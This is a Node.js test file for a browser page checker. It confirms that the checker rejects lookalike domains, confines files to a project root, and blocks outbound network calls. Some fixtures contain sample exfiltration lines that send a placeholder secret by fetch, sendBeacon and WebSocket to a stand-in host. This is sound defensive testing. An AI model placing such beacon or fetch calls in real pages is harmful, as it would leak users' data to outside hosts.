'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const {spawnSync} = require('node:child_process');
const {official, localTarget} = require('./check_browser.cjs');

const script = path.join(__dirname, 'check_browser.cjs');
const head = '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Test</title></head><body><h1>Synthetic test</h1>';
const tail = '</body></html>';
function fixture(content, extras = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'tinodash-check-'));
  fs.writeFileSync(path.join(root, 'index.html'), head + content + tail);
  for (const [name, body] of Object.entries(extras)) {
    const target = path.join(root, name);
    fs.mkdirSync(path.dirname(target), {recursive: true});
    fs.writeFileSync(target, body);
  }
  return root;
}
function run(root) {
  return spawnSync(process.execPath, [script, root, '--wait-ms', '80'], {encoding: 'utf8', timeout: 30000});
}

test('official URL allowlist rejects lookalikes', () => {
  assert.equal(official('https://www.irs.gov/publications/p523'), true);
  assert.equal(official('https://www.sfmta.com/'), true);
  assert.equal(official('https://irs.gov.example.com/'), false);
  assert.equal(official('http://www.irs.gov/'), false);
});

test('virtual project root refuses outside and absent targets', () => {
  const root = fixture('');
  try {
    assert.equal(localTarget(root, 'https://verification.invalid/project/index.html'), path.join(root, 'index.html'));
    assert.equal(localTarget(root, 'https://verification.invalid/other/index.html'), null);
    assert.equal(localTarget(root, 'https://verification.invalid/project/nope.html'), null);
    assert.equal(localTarget(root, 'https://external.invalid/project/index.html'), null);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('scenario click generates a properly sourced row', () => {
  const root = fixture(`<button id="run">Run scenario</button><div id="result"></div><script>
    document.getElementById('run').addEventListener('click',()=>{
      document.getElementById('result').innerHTML='<table><tr><td>Illustrative</td><td><a href="https://www.irs.gov/">Source</a></td></tr></table>';
    });</script>`);
  try {
    const result = run(root);
    assert.equal(result.status, 0, result.stderr + result.stdout);
    assert.match(result.stdout, /1 scenario button/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('dynamically generated rows require official sources', () => {
  const root = fixture(`<script>document.body.insertAdjacentHTML('beforeend', '<table><tr><td>Synthetic</td><td><a href="https://irs.gov.example.com/">not official</a></td></tr></table>');</script>`);
  try {
    const result = run(root);
    assert.equal(result.status, 1, result.stderr + result.stdout);
    assert.match(result.stdout, /1 rendered table data row/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('external fetch is blocked without printing the URL or its data', () => {
  const root = fixture(`<script>fetch('https://example.invalid/collect?secret=PRIVATE_TEST_VALUE').catch(()=>{});</script>`);
  try {
    const result = run(root);
    assert.equal(result.status, 1, result.stderr + result.stdout);
    assert.match(result.stdout, /external resource or network request/);
    assert.doesNotMatch(result.stdout + result.stderr, /PRIVATE_TEST_VALUE|example\.invalid/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('POST, beacons and socket attempts are blocked without printing their contents', () => {
  const root = fixture(`<script>
    fetch('data.json', {method: 'POST', body: 'PRIVATE_TEST_VALUE'}).catch(()=>{});
    navigator.sendBeacon('https://example.invalid/', 'PRIVATE_TEST_VALUE');
    try { new WebSocket('wss://example.invalid/'); } catch (e) {}
  </script>`);
  try {
    const result = run(root);
    assert.equal(result.status, 1, result.stderr + result.stdout);
    assert.match(result.stdout, /non-GET request/);
    assert.match(result.stdout, /a beacon, socket or peer connection was blocked/);
    assert.doesNotMatch(result.stdout + result.stderr, /PRIVATE_TEST_VALUE|example\.invalid/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('script exceptions and storage writes are detected without values', () => {
  const root = fixture(`<script>localStorage.setItem('synthetic','PRIVATE_TEST_VALUE'); throw new Error('PRIVATE_TEST_VALUE');</script>`);
  try {
    const result = run(root);
    assert.equal(result.status, 1, result.stderr + result.stdout);
    assert.match(result.stdout, /uncaught browser script error/);
    assert.match(result.stdout, /browser storage or cookies written/);
    assert.doesNotMatch(result.stdout + result.stderr, /PRIVATE_TEST_VALUE/);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});

test('local JSON can render inside the virtual Pages base', () => {
  const root = fixture(`<div id="result"></div><script>
    fetch('data/demo.json').then(r=>r.json()).then(()=>{
      document.getElementById('result').innerHTML='<table><tr><td>Synthetic</td><td><a href="https://www.boe.ca.gov/">Source</a></td></tr></table>';
    });</script>`, {'data/demo.json': '{"example":true}'});
  try {
    const result = run(root);
    assert.equal(result.status, 0, result.stderr + result.stdout);
  } finally { fs.rmSync(root, {recursive: true, force: true}); }
});
